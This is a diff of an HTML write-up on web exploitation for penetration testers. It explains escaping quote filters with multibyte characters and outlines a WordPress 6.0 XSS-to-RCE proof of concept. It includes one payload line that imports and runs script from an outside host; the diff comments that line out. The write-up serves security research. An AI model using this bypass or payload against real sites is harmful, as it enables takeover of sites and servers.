@@ -1,17 +1,17 @@
-<h1>Brute Logic Tricks: Advanced Techniques in Web Security Exploitation</h1>
+<h1>Brute Logic Tricks: Advanced Techniques in Web Security Exploitation</h1><br />
 The following write-up highlights advanced web exploitation techniques focusing on XSS (Cross-Site Scripting) vulnerabilities, WAF (Web Application Firewall) bypasses, and SSRF (Server-Side Request Forgery) scenarios. These methods are tailored for skilled penetration testers and security researchers, offering a deeper understanding of how to trick filters and evade detection in web applications.
-
-1. Escaping Filters Using Byte Bundles
-Concept: To bypass filters that escape specific characters such as single quotes (') when performing web attacks, particularly XSS, one can leverage bytes in the range of %A1 to %FE. These byte ranges can be combined with a single quote to outsmart the filter mechanism.
-
-Explanation: In web security, many systems sanitize or escape certain characters like %27 (which is the ASCII encoding for ') to prevent malicious injections. However, some filtering mechanisms do not account for all possible byte combinations. By using a byte from %A1 to %FE, you can evade certain character escape sequences and trick the filter into allowing the injection. This is particularly useful when performing brute-force logic attacks or exploring other injection techniques.
-
-2. WP 6.0 XSS to RCE Proof of Concept (PoC)
-Concept: In WordPress 6.0, a known exploit allows a user to escalate an XSS (Cross-Site Scripting) vulnerability to RCE (Remote Code Execution). The method involves creating a file (brute.txt) in the /wp-content/plugins folder.
+<br />
+<h3>1. Escaping Filters Using Byte Bundles</h3>
+<b>Concept:</b> To bypass filters that escape specific characters such as single quotes (') when performing web attacks, particularly XSS, one can leverage bytes in the range of %A1 to %FE. These byte ranges can be combined with a single quote to outsmart the filter mechanism.
+<br />
+<b>Explanation:</b> In web security, many systems sanitize or escape certain characters like %27 (which is the ASCII encoding for ') to prevent malicious injections. However, some filtering mechanisms do not account for all possible byte combinations. By using a byte from %A1 to %FE, you can evade certain character escape sequences and trick the filter into allowing the injection. This is particularly useful when performing brute-force logic attacks or exploring other injection techniques.
+<br />
+<h3>2. WP 6.0 XSS to RCE Proof of Concept (PoC)</h3>
+<b>Concept:</b> In WordPress 6.0, a known exploit allows a user to escalate an XSS (Cross-Site Scripting) vulnerability to RCE (Remote Code Execution). The method involves creating a file (brute.txt) in the /wp-content/plugins folder.
 
 Example:
 
-import('//X55.is/wp')
+<!--import('//X55.is/wp')-->
 Requirements:
 
 An admin user must be logged in with default write permissions.
